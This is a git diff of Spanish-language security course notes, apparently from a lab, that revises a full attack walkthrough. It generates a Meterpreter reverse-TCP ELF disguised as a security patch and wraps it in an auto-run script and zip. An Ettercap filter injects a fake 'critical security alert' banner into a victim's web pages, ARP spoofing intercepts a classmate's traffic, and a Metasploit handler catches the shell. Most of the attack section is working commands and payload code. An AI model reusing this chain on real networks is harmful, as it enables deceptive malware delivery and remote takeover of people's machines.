@@ -970,12 +970,11 @@ Para salir simplemente **exit** o **Ctrl+D**.
     Payload = Lo que haces después de entrar (código que se ejecuta)
 Un payload en Metasploit es la parte del exploit que se ejecuta en el sistema objetivo después de que una vulnerabilidad ha sido explotada con éxito.
 
-
-Como atacantes vamos a engañar a la víctima para que lea un pdf. Es la víctima la que se conecta al ssh.
+Crear un ejecutable con un payload de Meterpreter Reverse TCP para Linux, integrarlo en un filtro de Ettercap y aplicar técnicas de ingeniería social para que la víctima lo ejecute.
 Buscar los comandos en wireshark, o darle a las flechas hasta que aparezca el que queramos.
 
 Tenemos que darle permisos al fichero que le mandamos a nuestro compañero.
-Tenemos que mandar dichos permisos a través de un túnel. Si no lo hacemos, no funciona.
+Tenemos que mandar dichos permisos a través de un túnel o con un zip. Si no lo hacemos, no funciona.
 Hay que usar meterpreter, que usa comandos distintos. Tenemos que saber que comandos tenemos que usar.
 
 
@@ -996,10 +995,8 @@ Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html n
 
 1-Creamos payload:
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > actualizacion.bin
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.11.48.202 LPORT=4444 -f elf > parche_seguridad.elf
 ```
-
-Si usamos el túnel a Ip debe ser 127.0.0.1. Si no usamos debe ser la nuestra: 10.11.48.202
 
 msfvenom es la herramienta de metaspolit que genera payloads.
 - [p] indica el tipo de payload que se generará (en este caso un reverse tcp, lo que significa que el payload abrirá una conexión TCP inversa en el host especificado).
@@ -1010,54 +1007,92 @@ msfvenom es la herramienta de metaspolit que genera payloads.
 
 - [-f] indica el formato de salida del payload (en este caso .elf).
 
-- [> actualizacion.bin] esta parte redirige la salida del comando al archivo "actualizacion.bin".
+- [> parche_seguridad.elf] esta parte redirige la salida del comando al archivo "parche_seguridad.elf".
 
 <br>
 
-2-Permisos
+2-Crear script auto_ejecutable:
 ```bash
-chmod +x actualizacion.bin
+echo '#!/bin/bash
+echo "Instalando actualización de seguridad..."
+chmod +x parche_seguridad.elf
+./parche_seguridad.elf
+echo "Instalación completada."' > ejecutar_parche.sh
 ```
 
-Convierte el archivo en un programa que puede ejecutarse en Linux.
+Le damos permisos al script:
+```bash
+chmod +x ejecutar_parche.sh
+```
+
+Crea script que da permisos automáticamente.
 
 <br>
 
+3-Crear ZIP y ponerlo en Internet:
 
-3-Subir el payload y el script a Internet:
 ```bash
-curl -F "file=@actualizacion.bin" https://tmpfiles.org/api/v1/upload
+zip -j actualizacion_emergencia.zip parche_seguridad.elf ejecutar_parche.sh
 ```
-o manualmente en  tmpfiles.org
 
-**Los archivos en tmpfiles.org expiran en 1 hora** -> subirlos antes de hacer el ataque. Verificar que el enlace funciona.
+```bash
+zip -j actualizacion_emergencia.zip parche_seguridad.elf ejecutar_parche.sh
+```
 
-Cada vez que tengamos una URL nuevo tenemos que cambiarla abajo en el filtro (SIGUIENTE PASO).
+
+Empaqueta todo en un ZIP y lo sube a mi servidor web. Para subirlo a Internet, lo hice con Apache (recomendado):
+```bash
+cp actualizacion_emergencia.zip /var/www/html/
+```
+
+Este enlace funcionará siempre, siempre que el servidor esté encencido, es decir, si Apache está iniciado funcionará.
+
+
 
 4-Crear el filtro ettercap:
+
+```bash
+nano filtro_final.filter
+```
+
 ```html:
 if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "Accept-Encoding")) {
         replace("Accept-Encoding", "Accept-Rubbish!");
-        msg("###### Eliminando compresión ######\n");
     }
 }
 
 if (ip.proto == TCP && tcp.src == 80) {
-    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualizacion critica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Despues: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
-    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualizacion critica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Despues: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
+    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;border-bottom:3px solid white;'><h2>ALERTA DE SEGURIDAD CRITICA</h2><p><b>Actualizacion de emergencia requerida</b></p><a href='http://10.11.48.202/actualizacion_emergencia.zip' style='background:white;color:red;padding:10px 20px;text-decoration:none;font-weight:bold;border:2px solid white;display:inline-block;margin:10px;'>DESCARGAR PARCHE DE SEGURIDAD</a><p style='margin:5px;font-size:14px;'><b>Opcion 1:</b> Clic en el boton arriba</p><p style='margin:5px;font-size:14px;'><b>Opcion 2:</b> Ejecutar en terminal:<br><span style='background:black;padding:5px;font-family:monospace;'>wget http://10.11.48.202/actualizacion_emergencia.zip</span></p><p style='margin:5px;font-size:14px;'>Luego: <span style='background:black;padding:5px;font-family:monospace;'>unzip actualizacion_emergencia.zip && ./ejecutar_parche.sh</span></p></div>");
+
+    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;border-bottom:3px solid white;'><h2>ALERTA DE SEGURIDAD CRITICA</h2><p><b>Actualizacion de emergencia requerida</b></p><a href='http://10.11.48.202/actualizacion_emergencia.zip' style='background:white;color:red;padding:10px 20px;text-decoration:none;font-weight:bold;border:2px solid white;display:inline-block;margin:10px;'>DESCARGAR PARCHE DE SEGURIDAD</a><p style='margin:5px;font-size:14px;'><b>Opcion 1:</b> Clic en el boton arriba</p><p style='margin:5px;font-size:14px;'><b>Opcion 2:</b> Ejecutar en terminal:<br><span style='background:black;padding:5px;font-family:monospace;'>wget http://10.11.48.202/actualizacion_emergencia.zip</span></p><p style='margin:5px;font-size:14px;'>Luego: <span style='background:black;padding:5px;font-family:monospace;'>unzip actualizacion_emergencia.zip && ./ejecutar_parche.sh</span></p></div>");
 }
 ```
 
 Pone tu archivo en internet para que tu compañero lo pueda descargar. Además todo el tráfico que genere desde un navegador se le redirigirá a esta página.
 
-Esta página usa Ingeniería Social, le sale a la víctima en cualquier página que entre y le indica que hay una actualización pendiente en su navegador y que debe descargarla.
+Esta página usa Ingeniería Social, le sale a la víctima en cualquier página que entre y le indica que hay una actualización pendiente en su navegador y que debe descargarla. Se verá algo así:
+
+```bash
+ALERTA DE SEGURIDAD CRITICA
+Actualizacion de emergencia requerida
+
+[DESCARGAR PARCHE DE SEGURIDAD] ← Botón azul
+
+Opcion 1: Clic en el boton arriba
+Opcion 2: Ejecutar en terminal:
+wget http://10.11.48.202/actualizacion_emergencia.zip
+
+Luego: unzip actualizacion_emergencia.zip && ./ejecutar_parche.sh
+```
+
+
 
 <br>
 
 5-Compilarlo:
 ```bash
-etterfilter filtro.filter -o filtro.ef
+etterfilter filtro_final.filter -o filtro_final.ef
 ```
 Es unha herramienta de ettercap que procesa archivos de filtro (los archivos de filtro se procesan para aplicar reglas específicas a los datos o al tráfico que se está filtrando).
 
@@ -1065,7 +1100,7 @@ Es unha herramienta de ettercap que procesa archivos de filtro (los archivos de 
 
 <br>
 
-6-Permite que el tráfico pase a través de tu máquina (importante para el ataque Man-in-the-Middle).
+6- Activar Red: Permite que el tráfico pase a través de tu máquina (importante para el ataque Man-in-the-Middle).
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
@@ -1079,7 +1114,7 @@ En una terminal:
 
 7-Ejecutar Ettercap para esnifar la paquetería de la víctima:
 ```bash
-ettercap -T -i ens33 -M arp:remote /10.11.48.175// /10.11.48.1// -F filtro.ef
+ettercap -T -i ens33 -M arp:remote /10.11.48.175// /10.11.48.1// -F filtro_final.ef
 ```
 
 [-F] carga el filtro compilado
@@ -1088,16 +1123,6 @@ ettercap -T -i ens33 -M arp:remote /10.11.48.175// /10.11.48.1// -F filtro.ef
 En otra terminal:
 
 8-Abrir metasploit:
-
-- Si usamos el túnel:
-```bash
-msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set LHOST 0.0.0.0
-set LPORT 4444
-exploit
-```
 
 - Si no usamos túnel:
 ```bash
@@ -1117,9 +1142,15 @@ meterpreter>
 
 Para descargar basta con clicar en el enlace o hacer:
 ```bash
-wget -q -O actualizacion.bin http://tmpfiles.org/5766984/actualizacion.bin && ./actualizacion.bin
+wget http://10.11.48.202/actualizacion_emergencia.zip
 ```
 
+Para ejecutarlo:
+```bash
+unzip actualizacion_emergencia.zip
+./ejecutar_parche.sh
+```
+ 
 **!!Estamos dentro de la máquina del compañero!!**
 
 Comando de metasploit:
@@ -2949,6 +2980,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
